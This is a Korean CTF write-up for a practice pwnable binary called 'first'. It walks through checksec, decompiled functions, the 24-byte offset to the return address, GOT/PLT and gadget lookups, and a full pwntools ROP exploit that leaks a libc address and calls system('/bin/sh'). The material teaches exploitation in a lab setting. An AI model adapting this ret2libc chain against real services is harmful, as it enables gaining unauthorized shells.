# first 문제 풀이

- 라젠카 ROP(x64)를 참고하여 실습을 진행할 예정이다.



## Proof of concept

### checksec

![image](https://user-images.githubusercontent.com/59410565/119918504-924c9900-bfa3-11eb-9374-0d51887d1700.png)

64bit 파일이고, Partial RELRO와 NX가 적용되어 있다. 따라서 함수 호출 시 해당 함수의 주소의 알아오고, 이를 이용하여 NX bit를 우회하는 ROP 공격을 할 수 있을 것 같다.



### IDA

> main() 함수

![image](https://user-images.githubusercontent.com/59410565/119919504-8e217b00-bfa5-11eb-8615-ebe43920b4f9.png)

"This is my FIRST PWNABLE!!"을 출력하고 load(0xA(=10))을 반환한다.

> load() 함수

![image](https://user-images.githubusercontent.com/59410565/119919215-ead06600-bfa4-11eb-9269-2f3118c60d1f.png)

v2에 인자로 전달받은 a1(10)을 대입하고, "How Many Bullets do you have?"를 출력한다. v3을 입력받고 만약 a1이 v3보다  크다면 v2의 값을 v3으로 바꿔준다. 그리고 v2의 값과 함께 "You have %dbullets\n"을 출력한다.

> bang() 함수

![image](https://user-images.githubusercontent.com/59410565/119919241-f9b71880-bfa4-11eb-938b-1b4dab1d54d3.png)

"Who is your Target?"을 출력하고 read() 함수를 사용해 0x64(100)만큼 입력을 받는다. 이때 buf의 크기보다 더 많은 값을 입력받아 overflow가 발생한다.



### GDB

![image](https://user-images.githubusercontent.com/59410565/119920224-ec9b2900-bfa6-11eb-8cd3-221612dfee3e.png)

**[Break Point]**

- bang+0 : bang() 함수 코드 첫 부분
- bang+35 : read() 함수 호출 전

![image](https://user-images.githubusercontent.com/59410565/119922976-d80d5f80-bfab-11eb-85db-77e3679bdecc.png)

![image](https://user-images.githubusercontent.com/59410565/119923010-e5c2e500-bfab-11eb-858f-75d0e5648814.png)

Return address(0x7ffe3acb7838) - buf 변수의 시작 주소(0x7ffe3acb7820) = 24. 즉, 24개 이상의 문자를 입력함으로써 RET을 변조할 수 있다.



### plt, got 주소 찾기 - read, scanf

> pwntools를 사용하여 주소를 출력하기

```python
from pwn import *

e = ELF("./first")
print("read@plt : " + str(hex(e.plt["read"])))
print("read@got : " + str(hex(e.got["read"])))
print("scanf@plt : " + str(hex(e.plt["scanf"])))
print("scanf@got : " + str(hex(e.got["scanf"])))
```

![image](https://user-images.githubusercontent.com/59410565/119924153-0429e000-bfae-11eb-867d-da5810237daf.png)



### "/bin/sh" 찾기

![image](https://user-images.githubusercontent.com/59410565/119925390-52d87980-bfb0-11eb-8b4b-522a0985219e.png)

![image](https://user-images.githubusercontent.com/59410565/119925478-80bdbe00-bfb0-11eb-8e01-04d5e538bb48.png)

"/bin/sh"의 offset은 0x18ce57이다.



### 쓰기 가능한 영역 찾기

![image](https://user-images.githubusercontent.com/59410565/119924420-831f1880-bfae-11eb-8007-3bf54ff6a305.png)

해당 바이너리의 0x601000 ~ 0x602000 영역에 쓰기 권한이 부여되어 있다.

![image](https://user-images.githubusercontent.com/59410565/119924479-9d58f680-bfae-11eb-83a2-cb03b42d629e.png)

![image](https://user-images.githubusercontent.com/59410565/119924522-b5307a80-bfae-11eb-94df-db3f37bf5ff4.png)

.got.plt / .data / .bss 가 앞에서 확인한 쓰기 가능한 영역에 포함되어 있다.



### 가젯 찾기

> rp++

![image](https://user-images.githubusercontent.com/59410565/119924702-0ccee600-bfaf-11eb-8b49-9425e540b6d4.png)

> ROPgadget

![image-20210528122102639](C:\Users\hyera\AppData\Roaming\Typora\typora-user-images\image-20210528122102639.png)



### system() 주소 찾기

![image](https://user-images.githubusercontent.com/59410565/119926112-b44d1800-bfb1-11eb-89ab-f2025c83543f.png)

> elf.symbols[] : 바이너리 함수 내에서 정의된 함수의 주소
>
> a.plt(b.got) >> b의 주소를 a의 plt에 



### Exploit code

```python
from pwn import *
from struct import *
 
#context.log_level = 'debug'
r = process('./first')
e = ELF("./first")
  
libcbase_read_offset = e.libc.symbols['read']
print(hex(libcbase_read_offset))
libcbase_system_offset = 0x453a0 #elf.libc.symbols['system']

binsh_offset = 0x18ce57 

pop_rdi_ret = 0x400713

puts_plt = e.plt['puts']
read_got = e.got['read']
bang = e.symbols['bang']

payload = "A"*24
payload += p64(pop_rdi_ret)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(bang)

r.sendlineafter("have?\n",p64(1))
r.sendafter("Target?\n", payload)

read_addr = u64(r.recvuntil("\x7f")[-6:].ljust(8, '\x00'))
libcbase = read_addr - libcbase_read_offset
print(hex(read_addr))

payload = "A"*24
payload += p64(pop_rdi_ret)
payload += p64(libcbase + binsh_offset)
payload += p64(libcbase + libcbase_system_offset)

r.send(payload)
r.interactive()
```

